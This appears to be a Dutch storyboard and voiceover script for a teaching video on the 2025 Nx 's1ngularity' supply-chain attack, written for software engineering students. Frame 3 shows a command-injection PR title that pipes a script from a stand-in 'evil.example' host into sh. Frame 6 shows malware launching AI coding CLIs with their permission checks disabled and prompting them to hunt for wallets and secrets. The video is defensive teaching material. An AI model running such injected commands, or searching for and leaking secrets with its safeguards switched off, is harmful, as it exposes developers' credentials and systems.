---
format: 1920x1080
duration: 75s
message: "Eén PR-titel opende de CI van Nx; daarna liet de malware je eigen AI-assistent je secrets zoeken. CI is aanvalsoppervlak, en een AI-agent zonder vangrails doet ook wat malware vraagt."
arc: story-explainer with process
audience: 3de-jaarsstudenten software engineering
mode: autonomous
music: none
language: nl
---

## Video direction

- **palette system** — `frame.md` (Broadside). Dark register (ink-black ground, cream text, fire-orange accent) for the story frames 1, 3, 4, 5, 6, 7, 8. Orange register (fire-orange ground, ink text) only for the declarative frames 2 (the thesis) and 9 (the lesson). Fire-orange is the only accent: it marks the attacker's input (the PR title, the shellcode, the stolen token, the dangerous flags, the leaked numbers). No other colors.
- **type** — display / h1 in lowercase Barlow 900 as graphic primitive; IBM Plex Mono uppercase for kickers, timestamps and all code/terminal text (terminals and YAML are mono, lowercase allowed inside code). Code is real, from the source: `pull_request_target`, `${{ github.event.pull_request.title }}`, `NPM_TOKEN`, `telemetry.js`, `claude --dangerously-skip-permissions`, `gemini --yolo`, `q --trust-all-tools`, `s1ngularity-repository`.
- **recurring motif** — the PR title as a fire-orange mono strip. It enters in frame 3, travels into the bash line, and its consequence (a token) carries into frame 4. A mono kicker top-left in each dark frame acts as a chapter tag: `01 / TOEGANG`, `02 / VERSPREIDING`, `03 / PAYLOAD`, `04 / DETECTIE`.
- **motion grammar + reveal model** — long-tail `power3` decel for every entrance, no bounce or overshoot. Every piece reveals on the word that names it (VO-paced); never front-load. Typing is literal type-on with a caret (`discrete-text-sequence` + `context-sensitive-cursor`). Holds stay still; at most a blinking caret or a subtle jitter.
- **rhythm / held frames** — frame 2 (thesis) and frame 9 (lesson) are held declarative beats on the orange register: a few big reveals, then stillness. Frame 7's punchline holds still for its last second. Everything else develops across its full duration.
- **negative list** — no shadows, gradients, rounded cards, glow-blobs, bokeh or purple-blue "AI" gradients; no hacker clichés (green matrix rain, hooded figures, skulls); no fake browser chrome or cursors. Neither failure mode: no slideshow (everything on screen at t=0, then frozen) and no screensaver (many elements floating independently).
- **caption band** — keep all content in the top ~83%; the bottom band is for captions.

## Frame 1 — Hook: npm install

- scene: a terminal line types `npm install`; then, as the VO turns, the screen fills with mono file paths being scanned, one word in fire-orange: wachtwoorden
- voiceover: "Augustus 2025. Je typt npm install. En op je laptop begint je eigen AI-assistent naar je wachtwoorden te zoeken."
- duration: 9.6s
- transition_in: cut
- status: animated
- src: compositions/frames/01-hook.html
- type: hook
- persuasion: Imagine / scenario + direct address
- beat: unease + curiosity
- blueprint: typewriter-reveal (Adapt)
- focal: the terminal prompt line `$ npm install`
- roles: terminal prompt = foreground subject · scanned file-path list (`~/.ssh/id_rsa`, `~/.npmrc`, `.env`, `~/.config/gh/hosts.yml`, `wallet.dat`) = supporting, low-opacity cream · date kicker `AUGUSTUS 2025` = supporting

narrativeRole: Puts the student in the chair: an everyday command turns into a quiet theft, done by their own tool.
keyMessage: Something you run every day can turn your own AI against you.

Adapt: keep the typed-line signature (a human-typed command with caret); instead of collapsing into a brand, it collapses into the scanning list.
Scene 1 (0.0–1.6s): dark ground; mono kicker `AUGUSTUS 2025` fades up top-left as the VO says it. Nothing else.
Scene 2 (1.6–3.4s): centered at h1 scale in mono: `$ npm install` types on with a caret on "Je typt npm install"; caret blinks once after the last letter. Centered, ~55% width.
Scene 3 (3.4–7.4s): on "je eigen AI-assistent" the prompt line slides up and shrinks to the upper third; beneath it a column of file paths types in one by one, fast, like a search running (`discrete-text-sequence`), each dimming to ~40% as the next lands. Asymmetric 60/40, 3 layers.
Scene 4 (7.4–9.6s): on "wachtwoorden" the last path is replaced by the lowercase display word `wachtwoorden` in fire-orange, which snaps in over the dimmed list (`spring-pop-entrance`, smooth settle) and holds still.

## Frame 2 — Dit is s1ngularity

- scene: orange register; the name `s1ngularity` at display scale, then two short lines beneath: "één pr-titel" → "jouw ai deed de rest"
- voiceover: "Dit is singularity. Eén titel van een pull request opende de deur. Jouw AI deed de rest."
- duration: 6.72s
- transition_in: cut
- status: animated
- src: compositions/frames/02-thesis.html
- type: product_intro
- persuasion: Concept announcement + distillation
- beat: clarity + intrigue
- blueprint: kinetic-type-beats (Reproduce)
- focal: the word `s1ngularity`
- roles: `s1ngularity` = foreground subject (display, ink) · two thesis lines = supporting (h2, ink) · 36×2px ink rule stub = supporting

narrativeRole: Names the attack and states the whole story in two beats: one PR title in, your AI did the rest.
keyMessage: s1ngularity = één PR-titel + jouw eigen AI.

Scene 1 (0.0–1.8s): fire-orange ground, chrome suppressed; `s1ngularity` decodes in at display scale, left-aligned upper third (`hacker-flip-3d`, short), the `1` lands last. Kicker `NX · 26 AUGUSTUS 2025` sits above it at hint opacity.
Scene 2 (1.8–4.4s): on "Eén titel van een pull request" the first line `één pr-titel opende de deur` slides up beneath the name (per-word reveal, `dynamic-content-sequencing`).
Scene 3 (4.4–6.72s): on "Jouw AI deed de rest" the second line `jouw ai deed de rest.` lands below it, the word `ai` underlined by the ink rule stub drawing left-to-right; then hold still.

## Frame 3 — De kwetsbare workflow

- scene: a GitHub Actions YAML snippet builds line by line; the `${{ github.event.pull_request.title }}` expression sits inside a `run:` bash line; a fire-orange PR-title strip containing shellcode slides in and drops into that slot
- voiceover: "Nx had een workflow die de titels van pull requests controleerde. Die plakte de titel zomaar in een bash-commando. Dus zette de aanvaller er shellcode in."
- duration: 9.52s
- transition_in: crossfade
- status: animated
- src: compositions/frames/03-workflow.html
- type: feature_showcase
- persuasion: Demonstration (show the mechanism running)
- beat: comprehension + "aha"
- blueprint: compose
- focal: the `run:` line with the title expression
- roles: YAML panel (mono, cream on ink-black-alt, 1px border-dark frame) = foreground subject · PR-title strip `"; curl evil.sh | sh; echo "` = foreground accent (fire-orange) · kicker `01 / TOEGANG` = supporting

narrativeRole: Shows the exact hole: untrusted input pasted into a shell, under a trigger that has the base repo's rights.
keyMessage: De PR-titel werd uitgevoerd als code.

Scene 1 (0.0–3.2s): kicker `01 / TOEGANG` top-left. On "een workflow" a YAML panel (left 60% of frame) types in three lines: `on: pull_request_target`, `jobs:`, `  validate-title:` (`discrete-text-sequence`, line by line). `pull_request_target` is underlined in fire-orange as the VO says "titels van pull requests". Asymmetric 60/40.
Scene 2 (3.2–6.0s): on "plakte de titel zomaar in een bash-commando" the next line types: `    run: echo "${{ github.event.pull_request.title }}"`; the `${{ … }}` part gets a fire-orange marker box drawn around it (`css-marker-patterns`, box).
Scene 3 (6.0–9.52s): on "Dus zette de aanvaller er shellcode in" a fire-orange strip labeled `PR #` mono with the text `"; curl https://evil.example/x.sh | sh; echo "` slides in from the right rail (40% column), then moves into the marked slot and replaces the expression — the run line now reads with the shellcode in orange. Hold still for the last second.

## Frame 4 — Van token naar npm-token

- scene: a three-node chain left to right — PR-titel → token (schrijfrechten) → publicatie-workflow → NPM_TOKEN — drawing on beat, the final node in fire-orange
- voiceover: "Dat leverde een token met schrijfrechten op. Daarmee startte hij de publicatie-workflow. En die gaf het npm-token af."
- duration: 8.08s
- transition_in: crossfade
- status: animated
- src: compositions/frames/04-token-chain.html
- type: feature_showcase
- persuasion: Causal chain (A → B → C)
- beat: momentum + unease
- blueprint: compose
- focal: the final node `NPM_TOKEN`
- roles: chain nodes (mono labels in 1px-hairline boxes, cream) = foreground · connecting hairline arrows = supporting · small orange PR-strip stub at the far left (callback to frame 3) = supporting · kicker `01 / TOEGANG` = supporting

narrativeRole: Turns one injected command into the key to the npm package, step by step.
keyMessage: Eén token leidde naar het npm-token van het project.

Scene 1 (0.0–2.8s): full-width strip at ~40% height. The orange PR-strip stub sits far left; on "een token met schrijfrechten" an arrow draws right (`svg-path-draw`) to node 1 `GITHUB_TOKEN · write` which reveals.
Scene 2 (2.8–5.4s): on "startte hij de publicatie-workflow" a second arrow draws to node 2 `publish.yml`, with a small mono note `vanaf de branch van de aanvaller` beneath it.
Scene 3 (5.4–8.08s): on "gaf het npm-token af" a third arrow draws to node 3 `NPM_TOKEN`, which fills fire-orange with ink text and scales up slightly (smooth settle); hold.

## Frame 5 — Acht versies in twee uur

- scene: a horizontal timeline from 22:32 to 00:37 UTC; eight version tags pop onto it one by one; then a big stat `6 mln` downloads per week
- voiceover: "Op 26 augustus, in ruim twee uur: acht kwaadaardige versies van Nx. Een package met zes miljoen downloads per week."
- duration: 9.04s
- transition_in: push-slide LEFT
- status: animated
- src: compositions/frames/05-spread.html
- type: social_proof
- persuasion: Statistical proof + build-up
- beat: tension
- blueprint: dataviz-countup (Adapt)
- focal: the eight version markers on the timeline
- roles: timeline hairline with mono endpoints `26 AUG · 22:32 UTC` and `27 AUG · 00:37 UTC` = foreground · 8 version markers (mono tags `nx@…`, fire-orange ticks) = foreground · stat `6 mln / week` = supporting hero in the last scene · kicker `02 / VERSPREIDING`

Adapt: keep the count-up landing on one hero metric; the chart is a timeline with markers.
Scene 1 (0.0–2.4s): kicker; on "in ruim twee uur" the timeline hairline draws left to right across the upper half with its two endpoint labels (`svg-path-draw`). Full-width strip.
Scene 2 (2.4–5.2s): on "acht kwaadaardige versies" eight fire-orange tick markers pop onto the line in a quick staggered cascade, each with a small mono version tag — exactly these eight: `nx@20.9.0`, `nx@20.10.0`, `nx@20.11.0`, `nx@20.12.0`, `nx@21.5.0`, `nx@21.6.0`, `nx@21.7.0`, `nx@21.8.0`; a counter `0 → 8` sits above the line and ticks with them (`counting-dynamic-scale`).
Scene 3 (5.2–9.04s): on "zes miljoen downloads per week" the stat `6 mln` counts up at stat-value scale below the timeline, cream with an orange `downloads per week` label; hold still.

## Frame 6 — De AI als handlanger

- scene: a terminal panel; three commands type in one per name: `claude --dangerously-skip-permissions`, `gemini --yolo`, `q --trust-all-tools`, the flags in fire-orange; then a prompt line "You are a file-search agent…" and a "zoek: wallets · secrets" result
- voiceover: "Een postinstall-script zocht naar AI-tools op je machine. Claude. Gemini. Q. Het startte ze met de vangrails uit, en gaf één opdracht: zoek wallets en secrets."
- duration: 12.08s
- transition_in: push-slide LEFT
- status: animated
- src: compositions/frames/06-ai-accomplice.html
- type: feature_showcase
- persuasion: Demonstration + rule of three
- beat: fascination + unease
- blueprint: prompt-type-submit-generate (Adapt)
- focal: the three command lines with their dangerous flags
- roles: terminal panel (ink-black-alt, 1px border, mono) = foreground · file tag `postinstall → telemetry.js` = supporting · prompt quote = supporting · kicker `03 / PAYLOAD`

Adapt: keep the typed-command signature (the ask itself is the show); the "answer" is the AI's search target.
Scene 1 (0.0–3.0s): kicker; on "Een postinstall-script" a mono tag `"postinstall": "node telemetry.js"` types top-left of the panel (centered terminal, ~65% width).
Scene 2 (3.0–6.2s): on each name — "Claude", "Gemini", "Q" — one command line types in the terminal: `$ claude --dangerously-skip-permissions`, `$ gemini --yolo`, `$ q --trust-all-tools`. Tool names cream, flags plain cream for now.
Scene 3 (6.2–8.8s): on "met de vangrails uit" all three flags turn fire-orange at once (color swap + `css-marker-patterns` underline sweep).
Scene 4 (8.8–12.08s): on "één opdracht" a prompt line types below: `> "You are a file-search agent…"`; on "zoek wallets en secrets" two orange chips `wallets` and `secrets` pop in beside it; hold with the caret blinking.

## Frame 7 — Op je eigen GitHub

- scene: the stolen data as a block of base64 gibberish encoding three times, then a GitHub repo card `s1ngularity-repository` with a "Public" badge under the victim's own username
- voiceover: "De buit, drie keer base64-gecodeerd, ging naar een publieke repository. Op je eigen GitHub-account."
- duration: 7.12s
- transition_in: push-slide LEFT
- status: animated
- src: compositions/frames/07-exfil.html
- type: feature_showcase
- persuasion: Concretization + counterintuitive reveal
- beat: surprise + recognition
- blueprint: compose
- focal: the repo name `jij/s1ngularity-repository` with `public` badge
- roles: base64 block (mono, cream-hint) = background-midground · `×3` counter = supporting · repo card (1px hairline box, mono) = foreground · kicker `03 / PAYLOAD`

narrativeRole: Shows the twist: the loot was not hidden on an attacker's server but published on the victim's own account.
keyMessage: De gestolen secrets stonden publiek, op je eigen GitHub.

Scene 1 (0.0–3.0s): kicker; on "drie keer base64-gecodeerd" a block of plain text lines (`NPM_TOKEN=…`, `GITHUB_TOKEN=…`, `~/.ssh/id_rsa`) scrambles into base64 three times (`hacker-flip-3d` decode run in reverse, each pass longer), with a mono counter `×1 ×2 ×3` stepping beside it. Left 55%.
Scene 2 (3.0–5.2s): on "naar een publieke repository" the block shrinks into a repo card that appears on the right: `s1ngularity-repository` with a mono `PUBLIC` badge in fire-orange.
Scene 3 (5.2–7.12s): on "Op je eigen GitHub-account" the owner part of the repo name types in front of it: `jij/` — the card now reads `jij/s1ngularity-repository`; hold still.

## Frame 8 — De schade

- scene: three stat cards in a triptych: 2.349 gelekte secrets · 95 / 366 systemen · tweede golf: private → public
- voiceover: "GitGuardian telde 2.349 gelekte secrets. De AI-truc lukte op 95 van de 366 systemen. En in een tweede golf werden private repositories publiek gemaakt."
- duration: 13.6s
- transition_in: crossfade
- status: animated
- src: compositions/frames/08-damage.html
- type: social_proof
- persuasion: Statistical proof + rule of three
- beat: conviction
- blueprint: grid-card-assemble (Adapt)
- focal: the `2.349` stat
- roles: three stat-cards (top-border only, per frame.md) = foreground · source labels in mono (`GITGUARDIAN`, `WIZ`) = supporting · kicker `04 / DETECTIE`

Adapt: keep the staggered assemble of N cards; each card arrives on its own spoken number, not as one cascade.
Scene 1 (0.0–4.4s): kicker; on "2.349 gelekte secrets" card 1 rises in (left third) and its number counts up to `2.349` at stat-value scale in fire-orange (`counting-dynamic-scale`); label `gelekte secrets` + mono source `GITGUARDIAN`. Triptych.
Scene 2 (4.4–8.6s): on "95 van de 366 systemen" card 2 rises in (center); `95` counts up, then `/ 366` appears in cream-muted; a thin bar fills to 26% (`stat-bars-and-fills`); label `ai-truc gelukt`.
Scene 3 (8.6–13.6s): on "private repositories publiek" card 3 rises in (right); the mono word `PRIVATE` is struck through and swapped to `PUBLIC` in fire-orange (`discrete-text-sequence`); label `tweede golf`. Hold all three still.

## Frame 9 — Twee lessen

- scene: orange register; "twee lessen." then two big lowercase lines: "je ci is aanvalsoppervlak." and "een ai-agent zonder vangrails doet ook wat malware vraagt."
- voiceover: "Twee lessen. Je CI is aanvalsoppervlak. En een AI-agent die alles mag zonder te vragen, doet ook wat malware vraagt."
- duration: 11s
- transition_in: cut
- status: animated
- src: compositions/frames/09-lesson.html
- type: branding
- persuasion: Distillation + generalization
- beat: resolve
- blueprint: kinetic-type-beats (Reproduce)
- focal: the two lesson lines
- roles: lesson lines (h1, ink on orange, lowercase) = foreground · mono numerals `01` `02` = supporting · mono footer `NX S1NGULARITY · AUGUSTUS 2025` at hint opacity = supporting

narrativeRole: Generalizes the case into the two rules the course builds on (deel 6 CI-regels, deel 7 AI-agents).
keyMessage: Behandel CI als aanvalsoppervlak, en geef AI-agents geen vrijbrief.

Scene 1 (0.0–1.4s): fire-orange ground, chrome suppressed; kicker `twee lessen.` at h3 top-left.
Scene 2 (1.4–3.6s): on "Je CI is aanvalsoppervlak" line 1 with mono `01` lands per-word at h1 scale (`dynamic-content-sequencing`).
Scene 3 (3.6–9.04s): on "een AI-agent die alles mag" line 2 with `02` lands per-word below it: `een ai-agent zonder vangrails doet ook wat malware vraagt.`; the word `malware` gets an ink underline stub. Footer fades in at hint opacity; hold still to the end.
